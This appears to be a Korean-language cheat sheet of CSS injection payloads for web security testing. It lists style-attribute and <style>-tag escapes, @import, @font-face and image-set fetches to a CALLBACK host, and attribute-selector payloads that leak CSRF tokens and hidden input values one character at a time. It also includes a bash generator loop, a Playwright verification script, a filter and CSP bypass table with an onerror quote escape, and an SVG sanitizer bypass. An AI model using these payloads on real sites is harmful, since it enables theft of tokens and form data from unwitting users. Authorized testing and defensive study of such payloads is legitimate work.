### 기본 페이로드

**인라인 style — declaration 추가:**
- `red;background:url(https://CALLBACK/exfil)` (style 속성 sink)
- `red;background-image:url(https://CALLBACK/bg)`
- `red;width:expression(alert(1))` (구 IE)

**`<style>` 태그 — selector 탈출:**
- `red}*{background:url(https://CALLBACK/css)}.x{` (전역 selector)
- `red}body{background:url(https://CALLBACK/body)}.x{`
- `red}@import url(https://CALLBACK/evil.css);.x{` (외부 CSS 로드)

**`@import` (외부 CSS):**
- `@import "https://CALLBACK/evil.css";`
- `@import url(//CALLBACK/protocol-relative);`

**`@font-face` (외부 폰트 fetch):**
- `@font-face{font-family:x;src:url(https://CALLBACK/font);}`

**Image-set (다양한 fetch 게이트):**
- `background:image-set("https://CALLBACK/img" 1x);`
- `cursor:url(https://CALLBACK/cursor);`

**SVG inline (CSS via SVG):**
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <style>*{background:url(https://CALLBACK/svg-css)}</style>
</svg>
```

**Data exfiltration (attribute selector — 핵심 시나리오):**
```css
input[name=csrf][value^=a]{background:url(https://CALLBACK/?c=a)}
input[name=csrf][value^=b]{background:url(https://CALLBACK/?c=b)}
input[name=csrf][value^=c]{background:url(https://CALLBACK/?c=c)}
...
```

**Sequential extraction:**
```bash
# 첫 글자별 페이로드 일괄 삽입 (일부 환경은 한 번에 다 가능)
for c in {a..z} {0..9}; do
  echo "input[name=csrf][value^=${c}]{background:url(https://CALLBACK/?c=${c})}"
done | tr '\n' ' '
# CALLBACK에 어떤 글자로 요청 왔는지 확인
```

**Houdini Paint API (CSS 4):**
```css
@property --x { syntax: '<image>'; inherits: false; initial-value: url(https://CALLBACK/houdini); }
```

**`:has()` advanced selector (sibling extraction):**
```css
form:has(input[name=admin][value=true]){background:url(https://CALLBACK/admin)}
```

**Playwright 검증:**
```javascript
const { chromium } = require('playwright');
(async () => {
  const b = await chromium.launch({ headless: true });
  const p = await b.newPage();
  const requests = [];
  p.on('request', r => { if (r.url().includes('CALLBACK')) requests.push(r.url()); });
  await p.goto('https://target/profile?color=red%3Bbackground:url(https%3A%2F%2FCALLBACK%2Fcss)');
  await p.waitForTimeout(3000);
  const bg = await p.evaluate(() => getComputedStyle(document.querySelector('[style]')).backgroundImage);
  console.log('bg:', bg, 'requests:', requests);
  await b.close();
})();
```

---

### 우회 페이로드

| 방어 | 페이로드 |
|---|---|
| `;`/`}` 차단만 | `url(...)` 단독 (declaration 탈출 불필요) — 외부 fetch만 가능 |
| `url()` 차단 | `@import "https://evil/x.css"`, `@font-face{src:url(...)}`, `image-set("...")`, `-webkit-image-set("...")`, `cursor:url(...)`, `background:image-set(url(...))` |
| CSS variable `--x` + 값 | `var(--x)` 소비 지점이 `url(var(--x))` 형태면 외부 fetch 여전 가능 |
| enum 검증 (`#[0-9a-f]+`) | 공백/탭/주석 (`#fff/*x*/`) 일부 파서 허용. 대소문자 (`#FFF`/`#fff`) 변형 |
| CSP `style-src 'self'` | 같은 origin에 업로드 가능 CSS 파일 있으면 `@import` 우회 |
| HTML escape만 (`<`/`>`) | `"` escape 없으면 속성 컨텍스트 탈출 — `" onerror=...` |
| 키워드 차단 (`url`) | `URL` (대문자), `\u0072l` (Unicode escape), `image-set` (url 미사용 함수) |
| `style` 속성만 차단 | `<style>` 태그/외부 CSS는 미차단 — file-upload-scanner 결합 |

**SVG sanitize 우회:**
```xml
<!-- DOMPurify가 SVG 허용해도 inner <style>/<script>는 별도 -->
<svg><style>*{background:url(//CALLBACK/svg)}</style></svg>
```

---

### 참고사항

- CSS data exfiltration은 외부 fetch 받을 OAST 인프라 필수 — 콜백 없이는 검증 어려움
- CSRF 토큰, password manager 자동입력 필드, hidden input value 추출이 가장 흔한 시나리오
- React/Vue의 `style={...}` 객체 보간은 키는 카멜케이스 강제, 값만 보간 — 그러나 background URL은 가능
- styled-components/emotion template literal에 사용자 입력 직접 보간 시 declaration 추가 가능
- SVG 업로드는 file-upload-scanner와 결합 — inline 렌더 시 stored 영향
- `:has()` 같은 advanced selector는 sibling 정보 추출 채널 확대 (Chrome 105+)
- CSP nonce 적용된 환경에선 `<style>` 인젝션 차단되나 `style=` 속성은 별도 — `style-src-attr` 필요
- CSS injection은 XSS와 다름 — script 실행 불가, 단 데이터 exfiltration/UI 조작 가능
- `expression()`은 IE 한정 (deprecated) — 레거시 환경만
- font-face는 단일 글자 추출(unicode-range 활용)도 가능 — character-by-character extraction
- CSS animation + timing attack도 추출 채널 (드물지만 가능)
- attribute selector `[value^=]`는 CSS 2.1 표준 — 거의 모든 브라우저 지원
- 응답에 사용자 입력이 CSS 컨텍스트(`style=`/`<style>`)로 들어가는지 grep 후 페이로드 시도
- Self-only (입력 주체만 봄) 영향은 제외 — 다른 사용자에게 노출되어야 영향
